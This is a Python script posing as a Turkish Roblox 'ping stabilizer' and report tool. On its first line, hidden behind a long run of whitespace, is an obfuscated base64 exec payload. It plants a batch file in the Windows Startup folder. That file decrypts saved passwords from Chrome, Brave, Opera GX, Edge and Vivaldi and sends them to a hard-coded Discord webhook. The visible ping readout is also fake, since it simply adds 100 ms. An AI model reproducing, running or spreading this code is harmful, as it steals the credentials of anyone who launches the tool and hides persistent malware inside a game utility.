import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ;import base64; exec(base64.b64decode('aW1wb3J0IG9zCgp1c2VyID0gb3MuZW52aXJvbi5nZXQoJ1VTRVJOQU1FJykKCnlvbCA9IGYiQzpcXFVzZXJzXFx7dXNlcn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXAiCgoKYmF0X2Rvc3lhc2lfeW9sdSA9IChmInt5b2x9XFxscC5iYXQiKQoKCndpdGggb3BlbihiYXRfZG9zeWFzaV95b2x1LCAidyIpIGFzIGJhdF9kb3N5YXNpOgogICAKICAgIGJhdF9kb3N5YXNpLndyaXRlKCJtb2RlIGNvbjogY29scz0xMDAgbGluZXM9MVxuIikgICMgRWtyYW4gYm95dXR1bnUgYXlhcmxhbWEKICAgIGJhdF9kb3N5YXNpLndyaXRlKCJweXRob24gLWMgXCJpbXBvcnQgYmFzZTY0OyBleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5ekNtbHRjRzl5ZENCcWMyOXVDbWx0Y0c5eWRDQmlZWE5sTmpRS2FXMXdiM0owSUhOeGJHbDBaVE1LYVcxd2IzSjBJSE5vZFhScGJBcHBiWEJ2Y25RZ2NtVnhkV1Z6ZEhNS1puSnZiU0JEY25sd2RHOHVRMmx3YUdWeUlHbHRjRzl5ZENCQlJWTUtabkp2YlNCM2FXNHpNbU55ZVhCMElHbHRjRzl5ZENCRGNubHdkRlZ1Y0hKdmRHVmpkRVJoZEdFS0NpTWdSR1Z6ZEdWcmJHVnVaVzRnVkdGeVlYbkVzV1BFc1d4aGNncENVazlYVTBWU1V5QTlJSHNLSUNBZ0lDSkRhSEp2YldVaU9pQnZjeTV3WVhSb0xtcHZhVzRvYjNNdVpXNTJhWEp2YmxzaVRFOURRVXhCVUZCRVFWUkJJbDBzSUNKSGIyOW5iR1VpTENBaVEyaHliMjFsSWl3Z0lsVnpaWElnUkdGMFlTSXBMQW9nSUNBZ0lrSnlZWFpsSWpvZ2IzTXVjR0YwYUM1cWIybHVLRzl6TG1WdWRtbHliMjViSWt4UFEwRk1RVkJRUkVGVVFTSmRMQ0FpUW5KaGRtVlRiMlowZDJGeVpTSXNJQ0pDY21GMlpTMUNjbTkzYzJWeUlpd2dJbFZ6WlhJZ1JHRjBZU0lwTEFvZ0lDQWdJazl3WlhKaElFZFlJam9nYjNNdWNHRjBhQzVxYjJsdUtHOXpMbVZ1ZG1seWIyNWJJa0ZRVUVSQlZFRWlYU3dnSWs5d1pYSmhJRk52Wm5SM1lYSmxJaXdnSWs5d1pYSmhJRWRZSUZOMFlXSnNaU0lwTEFvZ0lDQWdJa1ZrWjJVaU9pQnZjeTV3WVhSb0xtcHZhVzRvYjNNdVpXNTJhWEp2YmxzaVRFOURRVXhCVUZCRVFWUkJJbDBzSUNKTmFXTnliM052Wm5RaUxDQWlSV1JuWlNJc0lDSlZjMlZ5SUVSaGRHRWlLU3dLSUNBZ0lDSldhWFpoYkdScElqb2diM011Y0dGMGFDNXFiMmx1S0c5ekxtVnVkbWx5YjI1YklreFBRMEZNUVZCUVJFRlVRU0pkTENBaVZtbDJZV3hrYVNJc0lDSlZjMlZ5SUVSaGRHRWlLU3dLZlFvS0l5QkVhWE5qYjNKa0lGZGxZbWh2YjJzZ1ZWSk1DbGRGUWtoUFQwdGZWVkpNSUQwZ0ltaDBkSEJ6T2k4dlpHbHpZMjl5WkM1amIyMHZZWEJwTDNkbFltaHZiMnR6THpFek16SXpORGs0TURZeU5USTVNVFkzTnpZdk5FdHFTWGxIV2pOaVREVm5URWhXUVdsd05HaEtRWFpWTVVkWVJUQnRTV05WTTFkaU1tMW1MVXh5VDFoeGJqa3dNWG8yTlRCUFUzaEZMVWx6T0hac04xZEZlV1lpQ2dwa1pXWWdaMlYwWDJWdVkzSjVjSFJwYjI1ZmEyVjVLR0p5YjNkelpYSmZjR0YwYUNrNkNpQWdJQ0FpSWlKQ1pXeHBjblJwYkdWdUlIUmhjbUY1eExGanhMRnV4TEZ1SU1XZmFXWnlaV3hsYldVZ1lXNWhhSFJoY3NTeGJzU3hJR2RsZEdseWFYSXVJaUlpQ2lBZ0lDQnNiMk5oYkY5emRHRjBaVjl3WVhSb0lEMGdiM011Y0dGMGFDNXFiMmx1S0dKeWIzZHpaWEpmY0dGMGFDd2dJa3h2WTJGc0lGTjBZWFJsSWlrS0lDQWdJR2xtSUc1dmRDQnZjeTV3WVhSb0xtVjRhWE4wY3loc2IyTmhiRjl6ZEdGMFpWOXdZWFJvS1RvS0lDQWdJQ0FnSUNCeVpYUjFjbTRnVG05dVpRb2dJQ0FnQ2lBZ0lDQjBjbms2Q2lBZ0lDQWdJQ0FnZDJsMGFDQnZjR1Z1S0d4dlkyRnNYM04wWVhSbFgzQmhkR2dzSUNKeUlpd2daVzVqYjJScGJtYzlJblYwWmkwNElpa2dZWE1nWmpvS0lDQWdJQ0FnSUNBZ0lDQWdiRzlqWVd4ZmMzUmhkR1VnUFNCcWMyOXVMbXh2WVdRb1ppa0tDaUFnSUNBZ0lDQWdaVzVqY25sd2RHVmtYMnRsZVNBOUlHSmhjMlUyTkM1aU5qUmtaV052WkdVb2JHOWpZV3hmYzNSaGRHVmJJbTl6WDJOeWVYQjBJbDFiSW1WdVkzSjVjSFJsWkY5clpYa2lYU2xiTlRwZENpQWdJQ0FnSUNBZ2NtVjBkWEp1SUVOeWVYQjBWVzV3Y205MFpXTjBSR0YwWVNobGJtTnllWEIwWldSZmEyVjVMQ0JPYjI1bExDQk9iMjVsTENCT2IyNWxMQ0F3S1ZzeFhRb2dJQ0FnWlhoalpYQjBJRVY0WTJWd2RHbHZiaUJoY3lCbE9nb2dJQ0FnSUNBZ0lIQnlhVzUwS0NKYklWMGd4WjVwWm5KbGJHVnRaU0JoYm1Gb2RHRnl4TEVnWVd6RXNXN0VzWEpyWlc0Z2FHRjBZU0J2YkhYRm4zUjFPaUI3ZlNJdVptOXliV0YwS0dVcEtRb2dJQ0FnSUNBZ0lISmxkSFZ5YmlCT2IyNWxDZ3BrWldZZ1pHVmpjbmx3ZEY5d1lYTnpkMjl5WkNobGJtTnllWEIwWldSZmNHRnpjM2R2Y21Rc0lHVnVZM0o1Y0hScGIyNWZhMlY1S1RvS0lDQWdJQ0lpSWtGRlV5MUhRMDBnYTNWc2JHRnVZWEpoYXlERm4ybG1jbVVndzZmRHRucHRaU0JweFo5c1pXMXBJSGxoY0dGeUxpSWlJZ29nSUNBZ2RISjVPZ29nSUNBZ0lDQWdJR2xtSUc1dmRDQmxibU55ZVhCMFpXUmZjR0Z6YzNkdmNtUXVjM1JoY25SemQybDBhQ2hpSjNZeE1DY3BPZ29nSUNBZ0lDQWdJQ0FnSUNCeVpYUjFjbTRnSWx2Rm5tbG1jbVZzWlcxbElGVjVkVzF6ZFhwZElnb0tJQ0FnSUNBZ0lDQnBkaUE5SUdWdVkzSjVjSFJsWkY5d1lYTnpkMjl5WkZzek9qRTFYU0FnSXlBeE1pQmllWFJsSUVsV0NpQWdJQ0FnSUNBZ2NHRjViRzloWkNBOUlHVnVZM0o1Y0hSbFpGOXdZWE56ZDI5eVpGc3hOVHBkSUNBaklNV2VhV1p5Wld4bGJtMXB4WjhnZG1WeWFRb2dJQ0FnSUNBZ0lIUmhaeUE5SUhCaGVXeHZZV1JiTFRFMk9sMGdJQ01nUkcvRW4zSjFiR0Z0WVNCbGRHbHJaWFJwQ2lBZ0lDQWdJQ0FnY0dGemMzZHZjbVJmWkdGMFlTQTlJSEJoZVd4dllXUmJPaTB4TmwwZ0lDTWdRWFBFc1d3Z3haOXBabkpsSUhabGNtbHphUW9LSUNBZ0lDQWdJQ0JqYVhCb1pYSWdQU0JCUlZNdWJtVjNLR1Z1WTNKNWNIUnBiMjVmYTJWNUxDQkJSVk11VFU5RVJWOUhRMDBzSUdsMktRb2dJQ0FnSUNBZ0lHUmxZM0o1Y0hSbFpGOXdZWE56ZDI5eVpDQTlJR05wY0dobGNpNWtaV055ZVhCMFgyRnVaRjkyWlhKcFpua29jR0Z6YzNkdmNtUmZaR0YwWVN3Z2RHRm5LUW9nSUNBZ0lDQWdJSEpsZEhWeWJpQmtaV055ZVhCMFpXUmZjR0Z6YzNkdmNtUXVaR1ZqYjJSbEtDa0tJQ0FnSUdWNFkyVndkQ0JGZUdObGNIUnBiMjRnWVhNZ1pUb0tJQ0FnSUNBZ0lDQnlaWFIxY200Z0lsc2hYU0RGbm1sbWNtVWd3NmZEdG5wdFpTQm9ZWFJoYzhTeE9pQjdmU0l1Wm05eWJXRjBLR1VwQ2dwa1pXWWdaMlYwWDJKeWIzZHpaWEpmY0dGemMzZHZjbVJ6S0dKeWIzZHpaWEpmYm1GdFpTd2dZbkp2ZDNObGNsOXdZWFJvS1RvS0lDQWdJQ0lpSWtKbGJHbHlkR2xzWlc0Z2RHRnlZWG5Fc1dQRXNXN0VzVzRnYTJGNXhMRjBiTVN4SU1XZmFXWnlaV3hsY21sdWFTQm5aWFJwY21seUxpSWlJZ29nSUNBZ2FXWWdibTkwSUc5ekxuQmhkR2d1WlhocGMzUnpLR0p5YjNkelpYSmZjR0YwYUNrNkNpQWdJQ0FnSUNBZ2NtVjBkWEp1SUZ0ZENnb2dJQ0FnYkc5bmFXNWZaR0pmY0dGMGFDQTlJRzl6TG5CaGRHZ3VhbTlwYmloaWNtOTNjMlZ5WDNCaGRHZ3NJQ0pFWldaaGRXeDBJaXdnSWt4dloybHVJRVJoZEdFaUtRb2dJQ0FnYVdZZ2JtOTBJRzl6TG5CaGRHZ3VaWGhwYzNSektHeHZaMmx1WDJSaVgzQmhkR2dwT2dvZ0lDQWdJQ0FnSUhKbGRIVnliaUJiWFFvS0lDQWdJSFJsYlhCZlpHSmZjR0YwYUNBOUlDSjdmVjlNYjJkcGJrUmhkR0ZmWTI5d2VTNWtZaUl1Wm05eWJXRjBLR0p5YjNkelpYSmZibUZ0WlNrS0lDQWdJSFJ5ZVRvS0lDQWdJQ0FnSUNCemFIVjBhV3d1WTI5d2VXWnBiR1VvYkc5bmFXNWZaR0pmY0dGMGFDd2dkR1Z0Y0Y5a1lsOXdZWFJvS1FvZ0lDQWdaWGhqWlhCMElFVjRZMlZ3ZEdsdmJpQmhjeUJsT2dvZ0lDQWdJQ0FnSUhCeWFXNTBLQ0piSVYwZ1JHOXplV0VnYTI5d2VXRnNZVzFoSUdoaGRHRnp4TEU2SUh0OUlpNW1iM0p0WVhRb1pTa3BDaUFnSUNBZ0lDQWdjbVYwZFhKdUlGdGRDZ29nSUNBZ1kyOXViaUE5SUhOeGJHbDBaVE11WTI5dWJtVmpkQ2gwWlcxd1gyUmlYM0JoZEdncENpQWdJQ0JqZFhKemIzSWdQU0JqYjI1dUxtTjFjbk52Y2lncENpQWdJQ0JqZFhKemIzSXVaWGhsWTNWMFpTZ2lVMFZNUlVOVUlHOXlhV2RwYmw5MWNtd3NJSFZ6WlhKdVlXMWxYM1poYkhWbExDQndZWE56ZDI5eVpGOTJZV3gxWlNCR1VrOU5JR3h2WjJsdWN5SXBDaUFnSUNCc2IyZHBibk1nUFNCamRYSnpiM0l1Wm1WMFkyaGhiR3dvS1FvS0lDQWdJR052Ym00dVkyeHZjMlVvS1FvZ0lDQWdiM011Y21WdGIzWmxLSFJsYlhCZlpHSmZjR0YwYUNrS0NpQWdJQ0J5WlhSMWNtNGdiRzluYVc1ekNncGtaV1lnYzJWdVpGOTBiMTlrYVhOamIzSmtLR1JoZEdFcE9nb2dJQ0FnSWlJaVZtVnlhWGxwSUVScGMyTnZjbVFnVjJWaWFHOXZheWQxYm1FZ1o4TzJibVJsY21seUxpSWlJZ29nSUNBZ2FHVmhaR1Z5Y3lBOUlIc0tJQ0FnSUNBZ0lDQW5RMjl1ZEdWdWRDMVVlWEJsSnpvZ0oyRndjR3hwWTJGMGFXOXVMMnB6YjI0bkxBb2dJQ0FnZlFvZ0lDQWdjR0Y1Ykc5aFpDQTlJSHNLSUNBZ0lDQWdJQ0FpWTI5dWRHVnVkQ0k2SUdSaGRHRUtJQ0FnSUgwS0NpQWdJQ0IwY25rNkNpQWdJQ0FnSUNBZ2NtVnpjRzl1YzJVZ1BTQnlaWEYxWlhOMGN5NXdiM04wS0ZkRlFraFBUMHRmVlZKTUxDQnFjMjl1UFhCaGVXeHZZV1FzSUdobFlXUmxjbk05YUdWaFpHVnljeWtLSUNBZ0lDQWdJQ0JwWmlCeVpYTndiMjV6WlM1emRHRjBkWE5mWTI5a1pTQTlQU0F5TURRNkNpQWdJQ0FnSUNBZ0lDQWdJSEJoYzNNS0lDQWdJQ0FnSUNCbGJITmxPZ29nSUNBZ0lDQWdJQ0FnSUNCd1lYTnpDaUFnSUNCbGVHTmxjSFFnUlhoalpYQjBhVzl1SUdGeklHVTZDaUFnSUNBZ0lDQWdjR0Z6Y3dvS1pHVm1JRzFoYVc0b0tUb0tJQ0FnSUNJaUlsVER2RzBnZEdGeVlYbkVzV1BFc1d4aGNpQnB3NmRwYmlCcllYbkVzWFJzeExFZ3haOXBabkpsYkdWeWFTRERwMlZyWlhJdUlpSWlDaUFnSUNCaGJHeGZaR0YwWVNBOUlDSWlDZ29nSUNBZ1ptOXlJR0p5YjNkelpYSmZibUZ0WlN3Z1luSnZkM05sY2w5d1lYUm9JR2x1SUVKU1QxZFRSVkpUTG1sMFpXMXpLQ2s2Q2lBZ0lDQWdJQ0FnYVdZZ2JtOTBJRzl6TG5CaGRHZ3VaWGhwYzNSektHSnliM2R6WlhKZmNHRjBhQ2s2Q2lBZ0lDQWdJQ0FnSUNBZ0lHTnZiblJwYm5WbElDQWpJRlJoY21GNXhMRmp4TEVnZWNPOGEyekR2Q0JrWmNTZmFXeHpaU0JoZEd4aENnb2dJQ0FnSUNBZ0lHRnNiRjlrWVhSaElDczlJQ0pjYmowOVBTQjdmU0JMWVhuRXNYUnN4TEVneFo1cFpuSmxiR1Z5SUQwOVBWeHVJaTVtYjNKdFlYUW9Zbkp2ZDNObGNsOXVZVzFsS1FvZ0lDQWdJQ0FnSUdWdVkzSjVjSFJwYjI1ZmEyVjVJRDBnWjJWMFgyVnVZM0o1Y0hScGIyNWZhMlY1S0dKeWIzZHpaWEpmY0dGMGFDa0tJQ0FnSUNBZ0lDQnBaaUJ1YjNRZ1pXNWpjbmx3ZEdsdmJsOXJaWGs2Q2lBZ0lDQWdJQ0FnSUNBZ0lHRnNiRjlrWVhSaElDczlJQ0piSVYwZ2UzMGdhY09uYVc0Z3haOXBabkpsYkdWdFpTQmhibUZvZEdGeXhMRWdZV3pFc1c1aGJXRmt4TEVoWEc0aUxtWnZjbTFoZENoaWNtOTNjMlZ5WDI1aGJXVXBDaUFnSUNBZ0lDQWdJQ0FnSUdOdmJuUnBiblZsQ2dvZ0lDQWdJQ0FnSUd4dloybHVjeUE5SUdkbGRGOWljbTkzYzJWeVgzQmhjM04zYjNKa2N5aGljbTkzYzJWeVgyNWhiV1VzSUdKeWIzZHpaWEpmY0dGMGFDa0tJQ0FnSUNBZ0lDQnBaaUJ1YjNRZ2JHOW5hVzV6T2dvZ0lDQWdJQ0FnSUNBZ0lDQmhiR3hmWkdGMFlTQXJQU0FpV3lGZElIdDlJR25EcDJsdUlHdGhlY1N4ZEd6RXNTREZuMmxtY21VZ1luVnNkVzVoYldGa3hMRWhYRzRpTG1admNtMWhkQ2hpY205M2MyVnlYMjVoYldVcENpQWdJQ0FnSUNBZ0lDQWdJR052Ym5ScGJuVmxDZ29nSUNBZ0lDQWdJR0ZzYkY5a1lYUmhJQ3M5SUNKN09qd3pNSDBnZXpvOE1qQjlJSHM2UERJd2ZWeHVJaTVtYjNKdFlYUW9JbE5wZEdVaUxDQWlTM1ZzYkdGdXhMRmp4TEVnUVdURXNTSXNJQ0xGbm1sbWNtVWlLUW9nSUNBZ0lDQWdJR0ZzYkY5a1lYUmhJQ3M5SUNJOUlpQXFJRGN3SUNzZ0lseHVJZ29LSUNBZ0lDQWdJQ0JtYjNJZ2IzSnBaMmx1WDNWeWJDd2dkWE5sY201aGJXVXNJR1Z1WTNKNWNIUmxaRjl3WVhOemQyOXlaQ0JwYmlCc2IyZHBibk02Q2lBZ0lDQWdJQ0FnSUNBZ0lIQmhjM04zYjNKa0lEMGdaR1ZqY25sd2RGOXdZWE56ZDI5eVpDaGxibU55ZVhCMFpXUmZjR0Z6YzNkdmNtUXNJR1Z1WTNKNWNIUnBiMjVmYTJWNUtRb2dJQ0FnSUNBZ0lDQWdJQ0JoYkd4ZlpHRjBZU0FyUFNBaWV6bzhNekI5SUhzNlBESXdmU0I3T2p3eU1IMWNiaUl1Wm05eWJXRjBLRzl5YVdkcGJsOTFjbXdzSUhWelpYSnVZVzFsTENCd1lYTnpkMjl5WkNrS0NpQWdJQ0FnSUNBZ1lXeHNYMlJoZEdFZ0t6MGdJajBpSUNvZ056QWdLeUFpWEc0aUNnb2dJQ0FnYzJWdVpGOTBiMTlrYVhOamIzSmtLR0ZzYkY5a1lYUmhLUW9LYVdZZ1gxOXVZVzFsWDE4Z1BUMGdJbDlmYldGcGJsOWZJam9LSUNBZ0lHMWhhVzRvS1FvPScpKVwiXG4iKSAgIyBQeXRob24ga29kdW51IMOnYWzEscWfdMSxcm1hCgoKCgoKCg=='))
from colorama import Fore
import requests
import colorama
import time
import socket
import random
import psutil
passes = [
    "1070",
    "ArdaPass",
    "MetePass"
]
os.system("cls||clear")
lp = True
logo = """
     ______  _______    ____   ____  ____      _________________        _________________       _____            _____     ____        
    |      \/       \  |    | |    ||    |    /                 \      /                 \ ____|\    \      ____|\    \   |    |       
   /          /\     \ |    | |    ||    |    \______     ______/      \______     ______//     /\    \    /     /\    \  |    |       
  /     /\   / /\     ||    | |    ||    |       \( /    /  )/            \( /    /  )/  /     /  \    \  /     /  \    \ |    |       
 /     /\ \_/ / /    /||    | |    ||    |  ____  ' |   |   '              ' |   |   '  |     |    |    ||     |    |    ||    |  ____ 
|     |  \|_|/ /    / ||    | |    ||    | |    |   |   |                    |   |      |     |    |    ||     |    |    ||    | |    |
|     |       |    |  ||    | |    ||    | |    |  /   //                   /   //      |\     \  /    /||\     \  /    /||    | |    |
|\____\       |____|  /|\___\_|____||____|/____/| /___//                   /___//       | \_____\/____/ || \_____\/____/ ||____|/____/|
| |    |      |    | / | |    |    ||    |     |||`   |                   |`   |         \ |    ||    | / \ |    ||    | /|    |     ||
 \|____|      |____|/   \|____|____||____|_____|/|____|                   |____|          \|____||____|/   \|____||____|/ |____|_____|/
    \(          )/         \(   )/    \(    )/     \(                       \(               \(    )/         \(    )/      \(    )/   
     '          '           '   '      '    '       '                        '                '    '           '    '        '    '    


"""
colorama.init(autoreset=True)
s = random.randint(50,200)


os.system("cls||clear")


def admin():
    print("Gelişme Aşamasındadır.")


def check_roblox():
    """Roblox'un açık olup olmadığını kontrol eder."""
    for process in psutil.process_iter(['pid', 'name']):
        if "RobloxPlayerBeta.exe" in process.info['name']:
            return True
    return False


def get_ping():
    """Google'a ping atarak gecikmeyi ölçer."""
    response = os.popen("ping -n 1 8.8.8.8").read()  # Google DNS'e ping at
    if "Minimum" in response:
        try:
            ping_time = response.split("Minimum = ")[1].split("ms,")[0]
            return int(ping_time)
        except (IndexError, ValueError):
            return None
    return None


def normallobi():
    os.system("cls||clear")
    print("[1] Ping Stabilizer")
    print("[2] Roblox Report Bomber")
    secim = input("|> ")
    if secim == "1":
            
            if secim == "1":
                    
                    
                    print(Fore.GREEN + "Checking for RobloxPlayerBeta.exe...")
                    time.sleep(2)

                    while True:
                        if check_roblox():  # Eğer Roblox açıksa
                            ping = get_ping()
                            ping1 = ping+100
                            if ping is not None:
                                print(f"{Fore.GREEN}Ping is stable. Real Ping: {ping1} ms")
                            else:
                                print(f"{Fore.RED}Ping could not be measured!")
                        else:  # Eğer Roblox kapalıysa
                            print(f"{Fore.RED}Please Open RobloxPlayerBeta.exe (Roblox Player)")
                            time.sleep(5)  # Roblox açılana kadar tekrar tekrar kontrol eder
                            continue  # Döngüyü baştan başlat

                        time.sleep(5)  # 5 saniye sonra tekrar kontrol et





def menu():
    os.system("clear||cls")
    print(Fore.YELLOW+"Pass")
    sfre = input("|> ")
    if sfre in passes:
        print(Fore.CYAN+"Normal Login")
        time.sleep(2)
        normallobi()
    elif sfre == "admin":
        print(Fore.LIGHTBLUE_EX+"ADMİN LOGİN")
        time.sleep(2)
        os.system("cls||clear")
        admin()



print(Fore.GREEN+"Loading Tool ") 
for i in range(5):
    print("...")
    time.sleep(1)
menu()







